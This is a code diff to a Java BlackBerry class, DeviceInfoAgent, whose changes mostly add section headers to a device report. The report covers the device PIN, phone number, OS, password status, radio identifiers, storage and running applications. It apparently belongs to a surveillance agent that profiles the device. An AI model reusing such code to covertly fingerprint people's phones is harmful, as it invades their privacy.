@@ -100,11 +100,12 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Debug\n");
         //#endif
 
+        sb.append("-- SYSTEM --\r\n");
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
         sb.append("Pin: " + Device.getPin() + "\n");
 
-        // OS Version
+        sb.append("-- OS --\r\n");
         sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
         sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
 
@@ -112,13 +113,14 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
         sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
-        // HARDWARE
+        sb.append("-- HARDWARE --\r\n");
         sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
         sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
         sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
         sb.append("Keypad layout: ");
-        switch(Keypad.getHardwareLayout()){
+        int keyLayout=Keypad.getHardwareLayout();
+        switch(keyLayout){
             case Keypad.HW_LAYOUT_32:
                 sb.append("32 " + "\n");
                 break;
@@ -134,7 +136,7 @@ public final class DeviceInfoAgent extends Agent {
             case Keypad.HW_LAYOUT_REDUCED_24:
                 sb.append("REDUCED" + "\n");
                 break;
-            case Keypad.HW_LAYOUT_TOUCHSCREEN_12:
+/*            case Keypad.HW_LAYOUT_TOUCHSCREEN_12:
                 sb.append("TOUCH " + "\n");
                 break;
             case Keypad.HW_LAYOUT_TOUCHSCREEN_12A:
@@ -154,12 +156,16 @@ public final class DeviceInfoAgent extends Agent {
                 break;
             case Keypad.HW_LAYOUT_TOUCHSCREEN_20K:
                 sb.append("TOUCH " + "\n");
-                break;
+                break;*/
+                
+                default:
+                    sb.append("UNK " +keyLayout+ "\n");
+                    break;
                
         }
 
         // Alimentazione
-        // sb.append("\nBATTERY\n-----\n");
+        sb.append("-- POWER --\r\n");
         sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
         sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
         sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
@@ -167,7 +173,7 @@ public final class DeviceInfoAgent extends Agent {
         sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
 
         // Radio
-        // sb.append("\nRADIO\n-----\n");
+        sb.append("-- RADIO --\r\n");
         if (Device.isCDMA()) {
             sb.append("CDMA\n");
             sb.append("SID: " + device.getSid() + "\n");
@@ -212,7 +218,7 @@ public final class DeviceInfoAgent extends Agent {
             //#endif
         }
 
-        // DISK
+        sb.append("-- FLASH --\r\n");
         sb.append("Flash Size: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
 
         sb.append("Free flash: " + Path.freeSpace(Path.USER) + " Bytes\n");
@@ -221,6 +227,7 @@ public final class DeviceInfoAgent extends Agent {
             sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
         }
 
+        sb.append("-- APPLICATIONS --\r\n");
         sb.append(getRunningApplications());
 
         try {
